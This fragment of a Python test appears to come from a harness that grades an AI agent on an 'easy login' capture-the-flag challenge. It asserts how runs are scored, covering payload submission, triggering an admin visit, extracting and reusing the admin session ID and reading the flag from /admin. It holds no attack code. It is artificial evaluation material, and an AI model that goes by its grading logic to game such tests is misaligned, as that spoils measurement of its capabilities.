    assert "worked" in summary_lower

    assessment = evaluate_easy_login_run(
        EasyLoginEvidence(
            observed_routes=("/login", "/visit", "/admin"),
            payload_submitted=runtime.payload_submitted,
            visit_triggered=runtime.visit_triggered,
            extracted_sid=runtime.extracted_sid,
            sid_note=sid_note,
            admin_sid_used=runtime.admin_sid_used,
            observed_flag=runtime.observed_flag,
            flag_source="/admin",
            stopped_immediately=True,
            post_flag_tool_calls=runtime.post_flag_tool_calls,
            clean_baseline=True,
            manual_intervention=False,
            successful_clean_runs=1,
        )
    )
    assert assessment.direction_judgement_success is True
    assert assessment.exploit_chain_success is True
    assert assessment.minimum_independent_success is True
    assert assessment.stable_independent_success is False
    assert assessment.highest_level is EasyLoginLevel.EXPLOIT
